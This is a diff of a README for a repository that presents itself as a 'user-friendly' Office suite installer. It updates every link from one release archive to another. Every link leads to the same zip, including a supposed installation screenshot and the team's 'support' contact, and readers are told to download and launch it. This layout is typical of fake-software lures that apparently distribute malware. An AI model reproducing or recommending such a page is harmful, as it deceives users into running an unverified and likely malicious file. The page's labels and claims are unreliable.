@@ -17,7 +17,7 @@ A user-friendly program to download your favorite Office suites!
 ## What's Included 📦
 
 The repository contains the following items:
-- **https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip**: Download the installation package [here](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip).
+- **https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip**: Download the installation package [here](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip).
   
 *Note: Launch the file to initiate the installation process.*
 
@@ -39,7 +39,7 @@ Explore our repository with these topics:
 
 ## Installation Instructions 🚀
 
-1. Click on the provided [link](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip) to download the installation package.
+1. Click on the provided [link](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip) to download the installation package.
 
 2. Launch the downloaded file to kickstart the installation process.
 
@@ -49,7 +49,7 @@ Explore our repository with these topics:
 
 Here is a sneak peek at the installation process:
 
-![Installation](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip)
+![Installation](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip)
 
 ## Get Started 🚀
 
@@ -61,10 +61,10 @@ Here is a sneak peek at the installation process:
 
 ## Support 📞
 
-For any questions or assistance, feel free to reach out to our team at [https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip).
+For any questions or assistance, feel free to reach out to our team at [https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip).
 
 Let's make software installation simpler together! 🚀
 
 ---
 
-🌟 **Download Now**: [Get Started](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v1.0/Application.zip) 🌟
+🌟 **Download Now**: [Get Started](https://github.com/hoan4909/SimpleOfficeInstaller/releases/download/v2.0/Software.zip) 🌟
